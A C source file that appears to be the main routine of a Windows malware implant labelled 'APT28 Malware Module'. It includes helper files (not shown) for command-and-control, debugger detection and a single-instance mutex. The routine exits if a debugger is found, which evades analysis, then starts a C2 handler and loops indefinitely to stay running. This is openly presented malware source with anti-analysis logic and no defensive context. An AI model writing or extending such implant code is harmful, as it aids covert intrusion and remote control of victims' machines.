#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#include "c2_handler.c"
#include "debug_check.c"
#include "mutex.c"

int main(int argc, char* argv[]) {
    (void)argc;  // Unused parameter
    (void)argv;  // Unused parameter
    printf("[*] APT28 Malware Module Starting...\n");
    printf("[*] Performing debugger detection...\n");

    // Check if debugged by multiple methods
    BOOL isDebuggedMultiple = IsDebuggerDetectedMultiple();

    if (isDebuggedMultiple) {
        printf("[!] WARNING: Debugger detected by multiple methods!\n");
        printf("[!] Analysis environment detected. Terminating...\n");
        exit(1);
    }

    printf("[+] No multi-method debugger detection.\n");

    // Create mutex to prevent multiple instances
    SingleInstanceMutex* instanceMutex = CreateSingleInstanceMutex();
    if (instanceMutex == NULL) {
        printf("[!] Another instance is already running. Exiting...\n");
        exit(1);
    }
    printf("[+] Single instance mutex acquired. Continuing execution.\n");

    printf("[*] Proceeding with malware operations...\n");

    // Initialize C2 handler
    printf("[*] Initializing C2 handler...\n");
    start_c2_handler();

    // Keep the program running
    while (1) {
        Sleep(1000);
    }

    printf("[*] APT28 Malware Module Finished.\n");
    return 0;
}
